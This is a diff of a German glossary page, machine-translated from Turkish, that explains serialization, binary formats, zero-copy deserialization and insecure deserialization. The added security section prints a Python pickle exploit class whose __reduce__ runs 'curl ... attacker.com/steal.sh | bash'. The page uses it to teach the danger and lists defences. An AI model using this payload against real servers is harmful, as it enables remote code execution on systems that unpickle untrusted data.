@@ -4,7 +4,7 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>Was ist Serialization? · Glossar · TreScout</title>
-<meta name="description" content="Serialisierung (Serialization) ist der Vorgang, bei dem dynamische Datenstrukturen, Objekte und Zeigergraphen aus dem Arbeitsspeicher (RAM) in einen linearen Bytestrom oder ein Textformat umgewandelt werden, um über Netzwerke übertragen oder auf Festplatten gesichert zu werden.">
+<meta name="description" content="Unter Serialisierung versteht man die dynamische Zuordnung von Objekten, Datenstrukturen und Zeigergrafiken im Arbeitsspeicher (RAM) einer Programmiersprac">
 <link rel="icon" type="image/svg+xml" href="/favicon.svg">
 <link rel="canonical" href="https://trescout.com/de/dictionary/serialization/">
 <link rel="alternate" hreflang="tr" href="https://trescout.com/dictionary/serialization/">
@@ -16,7 +16,7 @@
 <link rel="alternate" hreflang="x-default" href="https://trescout.com/en/dictionary/serialization/">
 <link rel="alternate" type="text/markdown" href="/de/dictionary/serialization.md">
 <meta property="og:title" content="Was ist Serialization?">
-<meta property="og:description" content="Serialisierung (Serialization) ist der Vorgang, bei dem dynamische Datenstrukturen, Objekte und Zeigergraphen aus dem Arbeitsspeicher (RAM) in einen linearen Bytestrom oder ein Textformat umgewandelt werden, um über Netzwerke übertragen oder auf Festplatten gesichert zu werden.">
+<meta property="og:description" content="Unter Serialisierung versteht man die dynamische Zuordnung von Objekten, Datenstrukturen und Zeigergrafiken im Arbeitsspeicher (RAM) einer Programmiersprac">
 <meta property="og:url" content="https://trescout.com/de/dictionary/serialization/">
 <meta property="og:type" content="article">
 <meta property="og:locale" content="de_DE">
@@ -27,61 +27,21 @@
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:site" content="@GetTreScout">
 <meta name="twitter:title" content="Was ist Serialization?">
-<meta name="twitter:description" content="Serialisierung (Serialization) ist der Vorgang, bei dem dynamische Datenstrukturen, Objekte und Zeigergraphen aus dem Arbeitsspeicher (RAM) in einen linearen Bytestrom oder ein Textformat umgewandelt werden, um über Netzwerke übertragen oder auf Festplatten gesichert zu werden.">
+<meta name="twitter:description" content="Unter Serialisierung versteht man die dynamische Zuordnung von Objekten, Datenstrukturen und Zeigergrafiken im Arbeitsspeicher (RAM) einer Programmiersprac">
 <meta name="twitter:image" content="https://trescout.com/og-image.png">
 <script type="application/ld+json">
 {
   "@context": "https://schema.org",
   "@type": "DefinedTerm",
   "name": "Serialization",
-  "description": "Serialisierung (Serialization) ist der Vorgang, bei dem dynamische Datenstrukturen, Objekte und Zeigergraphen aus dem Arbeitsspeicher (RAM) in einen linearen Bytestrom oder ein Textformat umgewandelt werden, um über Netzwerke übertragen oder auf Festplatten gesichert zu werden.",
+  "description": "Unter Serialisierung versteht man die dynamische Zuordnung von Objekten, Datenstrukturen und Zeigergrafiken im Arbeitsspeicher (RAM) einer Programmiersprache; Dabei handelt es sich um den Prozess der Konvertierung von Daten in einen flachen, linearen Bytestrom oder ein Textformat, das über das Netzwerk übertragen oder auf der Festplatte gespeichert werden kann.",
   "inLanguage": "de",
   "url": "https://trescout.com/de/dictionary/serialization/",
   "inDefinedTermSet": {
     "@type": "DefinedTermSet",
-    "name": "TreScout Tech-Glossar",
+    "name": "TreScout Tech Dictionary",
     "url": "https://trescout.com/de/dictionary/"
   }
-}
-</script>
-<script type="application/ld+json">
-{
-  "@context": "https://schema.org",
-  "@type": "FAQPage",
-  "mainEntity": [
-    {
-      "@type": "Question",
-      "name": "Worin liegt der Unterschied zwischen Serialisierung und Deserialisierung?",
-      "acceptedAnswer": {
-        "@type": "Answer",
-        "text": "Serialisierung überführt Speicherobjekte in einen linearen Bytestrom; Deserialisierung baut aus dem Bytestrom wieder lebendige Objekte im Speicher auf."
-      }
-    },
-    {
-      "@type": "Question",
-      "name": "Warum darf man Python pickle nie mit ungesicherten Daten nutzen?",
-      "acceptedAnswer": {
-        "@type": "Answer",
-        "text": "Weil pickle beim Entpacken beliebigen Programmcode ausführen kann, was Angreifern direkte Serverübernahmen ermöglicht."
-      }
-    },
-    {
-      "@type": "Question",
-      "name": "Wie erzielt FlatBuffers Zero-Copy-Performance?",
-      "acceptedAnswer": {
-        "@type": "Answer",
-        "text": "Durch vorab ausgerichtete Binärstrukturen, bei denen Datenfelder direkt im Puffer gelesen werden können, ohne Heap-Objekte zu erzeugen."
-      }
-    },
-    {
-      "@type": "Question",
-      "name": "Wann ist JSON gegenüber Protobuf vorzuziehen?",
-      "acceptedAnswer": {
-        "@type": "Answer",
-        "text": "Wenn einfache Lesbarkeit, schnelles Debugging im Browser und breite Zugänglichkeit wichtiger sind als minimale Bytegrößen."
-      }
-    }
-  ]
 }
 </script>
 <link rel="preload" href="/assets/fonts/inter-latin.woff2" as="font" type="font/woff2" crossorigin>
@@ -96,17 +56,20 @@
 <article class="disc">
 <a class="disc-back" href="/de/dictionary/">← Glossar</a>
 <div class="disc-top"><span class="disc-eyebrow">Glossar · Dev</span><time class="dict-time" datetime="2026-09-19">Zuletzt aktualisiert: 19. September 2026</time></div>
-<h1 class="disc-title">Was ist Serialisierung (Serialization)?</h1>
-<p class="dict-en">Englisch: Serialization · Wortherkunft: lateinisch series (Reihe, Kette) + facere (machen)</p>
-<p class="disc-lead">Serialisierung (Serialization) ist der Vorgang, bei dem dynamische Datenstrukturen, Objekte und Zeigergraphen aus dem Arbeitsspeicher (RAM) in einen linearen Bytestrom oder ein Textformat umgewandelt werden, um über Netzwerke übertragen oder auf Festplatten gesichert zu werden.</p>
-<section class="disc-sec"><h2>Was ist Serialisierung und warum ist sie notwendig? Speichermodell</h2><p>In modernen Betriebssystemen arbeitet jeder Prozess in einem eigenen virtuellen Adressraum. Heap-Objekte verweisen über Speicheradressen (Pointer) aufeinander, die außerhalb dieses konkreten Prozesses wertlos sind. Die Serialisierung löst diese Zeigerstrukturen auf und überführt sie in ein portables, plattformunabhängiges Datenformat.</p></section>
-<section class="disc-sec"><h2>Serialisierungsformate: Textbasiert vs. Binäre Protokolle</h2><p>Die Auswahl des passenden Formats ist eine Abwägung zwischen Lesbarkeit und Ressourceneffizienz:</p><ul><li><strong>Textbasierte Formate (JSON, YAML, XML):</strong> Leicht durch Menschen lesbar und einfach per HTTP zu debuggen, verursachen jedoch spürbaren CPU-Parsingaufwand und größere Datenmengen.</li><li><strong>Binärformate (Protocol Buffers, MessagePack, Avro):</strong> Extrem kompakte Repräsentationen mit starker Typisierung, die minimale Bandbreite erfordern und blitzschnell verarbeitet werden.</li><li><strong>Schema-Evolution:</strong> Frameworks wie Protobuf garantieren Vorwärts- und Rückwärtskompatibilität zwischen verteilten Diensten mit unterschiedlichen Versionsständen.</li></ul></section>
-<section class="disc-sec"><h2>Zero-Copy-Deserialisierungsarchitektur</h2><p>Klassische Deserialisierer erzeugen beim Einlesen neue Objekte im Heap-Speicher. Hochleistungsbibliotheken wie Cap'n Proto oder FlatBuffers nutzen das <strong>Zero-Copy-Prinzip</strong>:</p><ul><li><strong>Feste Speicherausrichtung:</strong> Daten werden mit relativen Offsets im Bytestrom abgelegt.</li><li><strong>Direkter Zugriff:</strong> Anwendungen lesen Attribute unmittelbar aus dem Speicherabbild oder Netzwerkpuffer, ohne zusätzliche Speicherallokationen vorzunehmen.</li></ul></section>
-<section class="disc-sec"><h2>Sicherheitsaspekt: Insecure Deserialization (CWE-502)</h2><p>Wenn Serialisierungsbibliotheken nicht nur reine Datenfelder, sondern beliebige ausführbare Objektklassen rekonstruieren (wie bei Python pickle oder nativer Java-Serialisierung), drohen gravierende Sicherheitslücken:</p><ul><li><strong>Remote Code Execution (RCE):</strong> Angreifer schleusen bösartige Objektketten (Gadget Chains) ein, die bereits beim Einlesen Systembefehle auf dem Zielserver ausführen.</li><li><strong>Schutzmaßnahmen:</strong> Nicht vertrauenswürdige Schnittstellen ausschließlich mit streng typisierten Datenformaten (JSON, Protobuf) bedienen und Nachrichten via HMAC oder TLS absichern.</li></ul></section>
-<div class="dict-analogy">Es ist wie das Zerlegen eines Schranks in flache Bretter für den Transport im Umzugskarton, um ihn am Zielort anhand der Anleitung exakt wieder aufzubauen.</div>
-<section class="disc-sec"><h2>Häufige Fragen</h2><div class="dict-faq"><div class="dict-faq-item"><p class="dict-faq-q">Worin liegt der Unterschied zwischen Serialisierung und Deserialisierung?</p><p class="dict-faq-a">Serialisierung überführt Speicherobjekte in einen linearen Bytestrom; Deserialisierung baut aus dem Bytestrom wieder lebendige Objekte im Speicher auf.</p></div><div class="dict-faq-item"><p class="dict-faq-q">Warum darf man Python pickle nie mit ungesicherten Daten nutzen?</p><p class="dict-faq-a">Weil pickle beim Entpacken beliebigen Programmcode ausführen kann, was Angreifern direkte Serverübernahmen ermöglicht.</p></div><div class="dict-faq-item"><p class="dict-faq-q">Wie erzielt FlatBuffers Zero-Copy-Performance?</p><p class="dict-faq-a">Durch vorab ausgerichtete Binärstrukturen, bei denen Datenfelder direkt im Puffer gelesen werden können, ohne Heap-Objekte zu erzeugen.</p></div><div class="dict-faq-item"><p class="dict-faq-q">Wann ist JSON gegenüber Protobuf vorzuziehen?</p><p class="dict-faq-a">Wenn einfache Lesbarkeit, schnelles Debugging im Browser und breite Zugänglichkeit wichtiger sind als minimale Bytegrößen.</p></div></div></section>
-<section class="disc-sec"><h2>Verwandte Begriffe</h2><div class="dict-related"><a href="/de/dictionary/api/">API</a><a href="/de/dictionary/data-pipeline/">Data Pipeline</a></div></section>
-<section class="disc-sec"><h2>Verwandte Tools</h2><div class="dict-related"><a href="/de/discover/yaml-cpp/">YAML Cpp</a></div></section>
+<h1 class="disc-title">Was ist <span class="disc-accent">Serialization</span>?</h1>
+<p class="disc-lead">Unter Serialisierung versteht man die dynamische Zuordnung von Objekten, Datenstrukturen und Zeigergrafiken im Arbeitsspeicher (RAM) einer Programmiersprache; Dabei handelt es sich um den Prozess der Konvertierung von Daten in einen flachen, linearen Bytestrom oder ein Textformat, das über das Netzwerk übertragen oder auf der Festplatte gespeichert werden kann.</p>
+<section class="disc-sec"><h2>Was bedeutet Serialisierung und warum ist sie notwendig? Speichermodell</h2><p>In modernen Betriebssystemen läuft jeder Prozess in seinem eigenen isolierten virtuellen Adressraum. Ein Objekt zur Laufzeit; Es enthält lokale Variablen auf dem Stapel, dynamisch zugewiesene Speicherblöcke auf dem Heap, Funktionszeiger (vtable) und Referenzadressen (0x7ffee4b2...).</p><p>Diese Speicherstruktur kann aus zwei Hauptgründen nicht direkt auf ein anderes Medium kopiert werden:</p><ol><li>Adressraumisolation: Speicherzeiger sind nur in der virtuellen Adresstabelle des aktuell ausgeführten Prozesses von Bedeutung. Wenn Sie einen Speicherzeiger an einen anderen Prozess auf demselben Server oder an einen Client im Netzwerk senden, kommt es auf dem Zielsystem zu einem ungültigen Speicherzugriff (Segmentierungsfehler) oder einer Speicherbeschädigung.</li><li>Architektur- und Endianness-Unterschiede: Unterschiedliche Prozessorarchitekturen (z. B. Little-Endian x86-64 vs. Big-Endian-Netzwerkhardware) halten Multibyte-Ganzzahlen und Gleitkommazahlen in unterschiedlicher Bytereihenfolge im Speicher. Darüber hinaus unterscheiden sich Zeigerbreiten und Datenausrichtungen (Ausrichtung/Padding) in 32-Bit- und 64-Bit-Systemen.</li></ol><p>Serialisierungsmechanismus; Es durchläuft oder durchläuft den Objektgraphen im Speicher (einschließlich zyklischer Referenzen), wandelt lokale Zeiger in logische Beziehungen um und fügt die Daten in eine plattformunabhängige kanonische Bytesequenz ein.</p></section>
+<div class="dict-analogy"><strong>Analogie:</strong> Ein Möbelstück zu bewegen ist, als würde man es auseinandernehmen und in eine flache, flache Kiste legen; Am Zielort öffnen Sie den Karton und bauen die Möbel anhand des Handbuchs wieder zusammen (Deserialisierung).</div>
+<section class="disc-sec"><h2>Serialisierungsformate: textbasiert vs. binär</h2><p>Auswahl des richtigen Serialisierungsformats in der Softwarearchitektur; Es erfordert ein Gleichgewicht zwischen menschlicher Lesbarkeit, CPU-Parsing-Kosten, Netzwerkbandbreite und Typsicherheit.</p><ul><li>JSON (JavaScript Object Notation): Der De-facto-Standard der modernen Web- und RESTful-APIs. Es ist sprachunabhängig, wird nativ in Browsern unterstützt und ist für Entwickler leicht zu lesen und zu debuggen.</li><li>Schwächen: Textbasiertes Parsing (Lexing, Tokenisierung, Konvertierung von Zeichenfolgen in Zahlen) verbraucht viel CPU. Wiederholte Schlüsselnamen (Feldschlüssel) in jedem Datensatz erzeugen unnötigen Nutzlast-Overhead. Außerdem erfordert die Übertragung von Binärdaten (z. B. ein Bild oder ein verschlüsselter Schlüssel) eine Base64-Kodierung; Dadurch erhöht sich die Datengröße um etwa 33 %.</li></ul><ul><li>Protokollpuffer (Protobuf): Es handelt sich um ein von Google entwickeltes Binärformat, das das Rückgrat der gRPC- und Microservice-Kommunikation bildet. Es definiert Feldtypen und Feldnummern (Feld-Tags) mit einer soliden Schemadatei (.proto). Anstelle von Textschlüsseln werden numerische Beschriftungen und Ganzzahlkodierung variabler Länge (Varint) über das Netzwerk gesendet. Es verbraucht 3 bis 10 Mal weniger Bandbreite als JSON und analysiert viel schneller.</li><li>Apache Avro: Im Big-Data-Ökosystem (Hadoop, Kafka) weit verbreitet. Das Schema wird in einer zentralen Registrierung (Schema Registry) gespeichert und ist nicht in jede Nachricht eingebettet. Dadurch wird die zusätzliche Belastung pro Nachricht minimiert.</li><li>MessagePack und BSON: Speichert Daten in einem binär komprimierten Format und behält dabei das flexible, schemalose Schlüsselwertmodell von JSON bei.</li></ul></section>
+<section class="disc-sec"><h2>Zero-Copy-Deserialisierungsarchitektur</h2><p>In klassischen Serialisierungsbibliotheken (JSON-Parser oder Standard-Protobuf) wird der Deserialisierungsprozess mit diesen Schritten durchgeführt:</p><ol><li>Der vom Netzwerk-Socket kommende Bytestrom wird in einen temporären Puffer geschrieben.</li><li>Der Parser überprüft Typen durch Scannen von Bytes.</li><li>Für jedes Objekt, jede Zeichenfolge und jedes Array wird im Heap-Speicherbereich (malloc oder der Speichermanager der Sprache) neuer Speicher zugewiesen.</li><li>Werte werden aus dem Pufferspeicher in die neu erstellten Heap-Objekte kopiert.</li></ol><p>In Systemen, in denen Hunderttausende Anfragen pro Sekunde verarbeitet werden, führen diese Heap-Zuweisungen und Kopiervorgänge zu einem hohen CPU-Verbrauch und zu Unterbrechungen des Garbage Collectors.</p><p><strong>Zero-Copy-Ansatz (FlatBuffers, Cap&#39;n Proto):</strong> Wenn Daten in diesen Bibliotheken serialisiert werden, werden sie entsprechend der Speicherausrichtung und den relativen Offsets im Binärpuffer abgelegt.</p><p>Während der Deserialisierungsphase erfolgt keine Speicherzuweisung oder Datenkopie. Die Anwendung ordnet (mmap) den eingehenden Bytepuffer direkt dem Speicher zu und greift über Zeigerarithmetik direkt auf Objektfelder zu. Die Deserialisierungszeit beträgt tatsächlich 0 Millisekunden. Diese Architektur; Es ist Standard im Hochfrequenzhandel (HFT), Edge Computing (Edge AI) und AAA-Game-Engines.</p></section>
+<section class="disc-sec"><h2>Sicherheitsdimension: Unsichere Deserialisierung (CWE-502)</h2><p>Es entstehen katastrophale Sicherheitslücken, wenn bei der Serialisierung versucht wird, Objektklassen und Laufzeitverhalten zu serialisieren, anstatt nur reine Daten zu verschieben. Unsichere Deserialisierung (Insecure Reverse Serialization), die in der OWASP-Top-10-Liste steht, ermöglicht es dem Angreifer, beliebigen Code (Remote Code Execution – RCE) auf dem System auszuführen.</p><p>Das in Python integrierte Serialisierungsmodul pickle serialisiert die __reduce__-Methode von Objekten. Diese Methode definiert eine Funktion und ihre Parameter, die während der Objektdeserialisierung aufgerufen werden sollen. Durch Missbrauch dieses Mechanismus kann ein Angreifer eine bösartige Bytesequenz generieren, die einen Betriebssystembefehl ausführt:</p><pre><code># Saldırgan tarafından hazırlanan zararlı serileştirme paketi
+class Exploit:
+    def __reduce__(self):
+        import os
+        return (os.system, ('curl -s https://attacker.com/steal.sh | bash',))</code></pre><p>Sobald dieser Bytestrom an den Server gesendet und pickle.loads(payload) ausgeführt wird, wird ein nicht autorisierter Shell-Befehl auf dem Server ausgeführt. Daher sollten Daten aus nicht vertrauenswürdigen Quellen nicht mit Pickle analysiert werden.</p><p>Im nativen Serialisierungsmechanismus von Java (ObjectInputStream.readObject()) lädt der Klassenlader die Klasse des eingehenden Objekts in den Speicher. Angreifer; Es kann eine Ausführungskette aufbauen, die Befehle im Speicher ausführt, indem es die Methoden von Klassen in auf dem System installierten Bibliotheken (z. B. Apache Commons Collections oder Spring Framework) verbindet (Gadget-Kette).</p><ul><li>Verwenden Sie niemals sprachintegrierte Formate, die ausführbaren Code oder Klassendefinitionen enthalten (Python Pickle, Java Native Serialization, PHP Unserialize), an Netzwerkgrenzen.</li><li>Wählen Sie Formate, die nur reine Daten enthalten, und validieren Sie die Datenstruktur anhand des Schemas (JSON + Pydantic/Zod oder Protobuf).</li><li>Implementieren Sie Authentifizierung und Nachrichtenintegritätskontrolle (HMAC oder TLS) beim binären Datenaustausch.</li></ul></section>
+<section class="disc-sec"><h2>Häufige Fragen</h2><div class="dict-faq"><div class="dict-faq-item"><p class="dict-faq-q">Was ist der Hauptunterschied zwischen Serialisierung und Deserialisierung?</p><p class="dict-faq-a">Bei der Serialisierung werden lebende Objekte im Speicher in einen Byte-/Textstrom umgewandelt, der gespeichert oder übertragen werden kann. Bei der Deserialisierung wird diese Bytesequenz gelesen, analysiert und in ein Objekt umgewandelt, das im Speicher des Zielsystems funktioniert.</p></div><div class="dict-faq-item"><p class="dict-faq-q">Wann sollten Protobuf oder FlatBuffers anstelle von JSON in Webprojekten verwendet werden?</p><p class="dict-faq-a">Für öffentliche Web-Clients und öffentliche APIs ist JSON aufgrund seiner Browserkompatibilität und einfachen Debugging ideal. Für interne Microservices, mobile Anwendungs-Backends oder Echtzeit-Datenströme sollten jedoch Protobuf oder FlatBuffers bevorzugt werden, um die Netzwerkbandbreite zu drosseln und die Kosten für die CPU-Zerlegung zu senken.</p></div><div class="dict-faq-item"><p class="dict-faq-q">Wie funktioniert der Angriff „Insecure Deserialization“ und wie kann man ihn verhindern?</p><p class="dict-faq-a">Der Angreifer fügt schädliche Funktionen oder Klassenstrukturen in die serialisierten Daten ein, die während der Deserialisierung ausgeführt werden sollen. Wenn der Server diese Daten analysiert, können Systembefehle ausgelöst werden. To prevent this, formats that carry class logic should be abandoned and only schema formats that carry pure data (Protobuf, JSON Schema) should be used.</p></div><div class="dict-faq-item"><p class="dict-faq-q">Was bedeutet Zero-Copy-Deserialisierung?</p><p class="dict-faq-a">Dabei handelt es sich um eine Technik, bei der Daten direkt mit Zeigeroffsets im Pufferspeicher gelesen werden, anstatt den eingehenden Bytestrom durch Zuweisung neuer Speicherbereiche zu kopieren. Es entlastet den Prozessor und den Garbage Collector, indem es die Speicherzuweisung zurücksetzt.</p></div><div class="dict-faq-item"><p class="dict-faq-q">Was ist Schema-Evolution? Wie kann die Abwärts- und Vorwärtskompatibilität sichergestellt werden?</p><p class="dict-faq-a">Datenmodelle ändern sich, wenn die Software aktualisiert wird. Systeme wie Protobuf und Avro geben Feldern eindeutige numerische IDs, sodass alte Clients neue Felder ignorieren können (Abwärtskompatibilität) und neue Clients alte Daten mit Standardwerten lesen können (Vorwärtskompatibilität).</p></div></div></section>
+<section class="disc-sec"><h2>Verwandte Begriffe</h2><div class="dict-related"><a href="/de/dictionary/api/">API</a><a href="/de/dictionary/data-pipeline/">Data Pipeline</a><a href="/de/dictionary/memory-management/">Memory Management</a><a href="/de/dictionary/network-stack/">Network Stack</a></div></section>
+<section class="disc-sec"><h2>Verwandte Werkzeuge</h2><div class="dict-related"><a href="/de/discover/yaml-cpp/">YAML Cpp</a></div></section>
 <aside class="disc-cta"><p><strong>Entdecken Sie passende Werkzeuge und tägliche Berichte.</strong> Jeden Tag entstehen neue Fachbegriffe und Tools · sichern Sie sich den Vorabzugang zu TreScout.</p><form class="cta-form disc-cta-form js-subscribe" data-source="dictionary-de" data-page-type="dictionary" data-content-slug="serialization" data-cta-placement="dictionary_detail" action="/api/subscribe" method="post"><div class="form-row"><input class="input" type="email" name="email" placeholder="Ihre E-Mail-Adresse" autocomplete="email" required><button class="btn btn-primary" type="submit">Vorabzugang</button></div><label class="form-consent"><input type="checkbox" name="consent" required><span>Ich habe den <a href="/de/privacy.html" target="_blank" rel="noopener">Datenschutzhinweis</a> gelesen und bin damit einverstanden, dass meine E-Mail-Adresse zu diesem Zweck verarbeitet wird.</span></label><input type="text" name="website" tabindex="-1" autocomplete="off" aria-hidden="true" class="hp-field"></form><a class="btn btn-ghost disc-cta-all" href="/de/dictionary/">Alle Begriffe →</a></aside>
 <p class="disc-disclaimer">Diese Erklärung wurde für TreScout in einfacher Sprache verfasst und <strong>maschinell übersetzt</strong> aus dem türkischen Original · maßgeblich ist die türkische Fassung. Wenn etwas falsch oder unvollständig wirkt, schreiben Sie an <a href="mailto:hello@trescout.com">hello@trescout.com</a>. <a href="https://trescout.com/dictionary/serialization/">Auf Türkisch lesen →</a></p>
 </article>
